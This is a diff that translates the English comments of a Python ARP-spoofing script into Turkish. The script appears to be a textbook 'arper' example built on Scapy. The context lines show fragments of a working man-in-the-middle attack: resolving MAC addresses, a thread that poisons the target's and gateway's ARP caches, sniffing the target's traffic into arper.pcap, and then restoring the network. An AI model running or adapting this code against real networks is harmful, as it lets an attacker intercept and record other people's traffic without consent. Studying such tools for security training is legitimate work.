@@ -11,7 +11,7 @@ poisoning = True
 
 
 def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
-    # slightly different method using send
+    # send kullanarak biraz farklı bir yöntem
     print("[*] Restoring target...")
     send(ARP(op=2,
              psrc=gateway_ip,
@@ -34,7 +34,7 @@ def get_mac(ip_address):
         retry=10
     )
 
-    # return the MAC address from a response
+    # MAC adresini bir yanıttan döndür
     for s, r in responses:
         return r[Ether].src
     return None
@@ -67,10 +67,10 @@ def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
     return
 
 
-# set our interface
+# arayüzü ayarla
 conf.iface = interface
 
-# turn off output
+# çıktıyı kapat
 conf.verb = 0
 
 print("[*] Setting up %s" % interface)
@@ -91,7 +91,7 @@ if tgt_mac is None:
 else:
     print("[*] Target %s is at %s" % (tgt_ip, tgt_mac))
 
-# start poison thread
+# poison thread başlat
 poison_thread = threading.Thread(target=poison_target,
                                  args=(tgt_gateway,
                                        tgt_gateway_mac,
@@ -107,7 +107,7 @@ try:
                     filter=bpf_filter,
                     iface=interface
                     )
-    # write out the captured packets
+    # yakalanan paketleri yaz
     print("[*] Writing packets to arper.pcap")
     wrpcap('arper.pcap', packets)
 
@@ -116,10 +116,10 @@ except KeyboardInterrupt:
 
 finally:
     poisoning = False
-    # wait for poisoning thread to exit
+    # poisoning thread'in çıkmasını bekleyin
     time.sleep(2)
 
-    # restore the network
+    # ağı geri yükle
     restore_target(tgt_gateway,
                    tgt_gateway_mac,
                    tgt_ip,
